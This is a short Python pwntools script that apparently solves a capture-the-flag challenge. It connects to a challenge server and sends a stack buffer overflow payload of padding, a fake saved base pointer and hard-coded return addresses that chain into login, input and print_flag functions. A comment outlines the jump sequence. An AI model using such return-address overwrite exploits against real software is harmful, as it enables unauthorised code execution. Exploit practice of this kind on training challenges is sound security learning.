#!/usr/bin/env python3

from pwn import *

con = remote("challs.studsec.nl", 9400)

fil_buf = b'\xff' * 112

rbp = b'\xff' * 8

login_addr = 0x4011f6.to_bytes(8, "little")
print_addr = 0x40120e.to_bytes(8, "little")
get_input_addr = 0x4012b6.to_bytes(8, "little")

input1 = fil_buf + rbp + login_addr + rbp + get_input_addr
input2 = fil_buf + rbp + print_addr + b'\xff'

print(input1)
print(input2)

con.sendline(input1)
con.sendline(input2)

print(con.recvall())

'''
concept
    get_input() -> login() + 2 -> print_flag() + 1
    need to set printFlag in stack before jump to print_flag()


'''
